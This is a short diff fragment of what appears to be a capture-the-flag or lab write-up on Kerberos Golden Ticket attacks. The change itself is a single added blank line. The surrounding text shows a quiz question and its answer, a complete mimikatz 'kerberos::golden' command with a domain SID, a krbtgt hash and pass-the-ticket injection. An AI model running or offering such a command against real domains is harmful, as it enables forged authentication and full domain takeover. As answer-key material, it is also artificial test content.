@@ -195,6 +195,7 @@ Golden Ticket is a forged Kerberos Ticket-Granting Ticket (TGT), allowing an att
 </details>
 
 >Q14) What command was used to perform the attack? (Format: Command)
+
 <details>
   <summary>Answer</summary>
 <pre><code>mimikatz.exe  "kerberos::golden /user:mtyson /domain:highlysecured.tech /sid:S-1-5-21-2778836013-2025790062-2140220986-1108 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /id:500 /ptt"</code></pre>
